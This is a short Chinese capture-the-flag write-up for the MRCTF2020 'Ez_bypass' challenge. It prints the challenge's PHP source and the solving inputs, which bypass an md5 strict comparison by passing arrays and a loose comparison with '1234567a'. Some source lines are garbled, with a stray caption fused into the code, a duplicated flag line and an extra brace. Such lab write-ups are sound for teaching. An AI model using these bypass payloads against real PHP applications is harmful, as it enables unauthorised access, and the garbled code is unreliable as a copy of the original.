# \[MRCTF2020]Ez\_bypass

## \[MRCTF2020]Ez\_bypass

## 考点

* PHP数组绕过md5
* PHP弱比较

## wp

给了源码

```php
给了源码$flag='MRCTF{xxxxxxxxxxxxxxxxxxxxxxxx}';$flag='MRCTF{xxxxxxxxxxxxxxxxxxxxxxxxx}';
if(isset($_GET['gg'])&&isset($_GET['id'])) {
    $id=$_GET['id'];
    $gg=$_GET['gg'];
    if (md5($id) === md5($gg) && $id !== $gg) {
        echo 'You got the first step';
        if(isset($_POST['passwd'])) {
            $passwd=$_POST['passwd'];
            if (!is_numeric($passwd))
            {
                 if($passwd==1234567)
                 {
                     echo 'Good Job!';
                     highlight_file('flag.php');
                     die('By Retr_0');
                 }
                 else
                 {
                     echo "can you think twice??";
                 }
            }
            else{
                echo 'You can not get it !';
            }

        }
        else{
            die('only one way to get the flag');
        }
}
    else {
        echo "You are not a real hacker!";
    }
}
else{
    die('Please input first');
}
}
```

gg与id的md5强等于，但是gg与id不同，数组绕过即可

passwd不是数字，但是passwd与1234567弱等于，使用1234567a绕过即可

```
GET  ?gg[]=1&id[]=2
POST passwd=1234567a
```
